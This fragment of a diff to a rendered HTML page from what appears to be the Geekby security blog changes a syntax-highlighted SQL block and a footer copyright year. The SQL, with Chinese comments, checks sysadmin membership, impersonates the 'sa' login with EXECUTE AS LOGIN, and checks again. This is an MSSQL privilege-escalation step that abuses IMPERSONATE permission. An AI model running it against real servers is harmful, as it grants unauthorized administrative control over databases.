-</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="c1">-- 验证是否为sysadmin权限
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 模拟sa登录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">EXECUTE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 验证是否为sysadmin权限
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -1089,7 +1089,7 @@ WHERE a.permission_name = &#39;IMPERSONATE&#39;
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
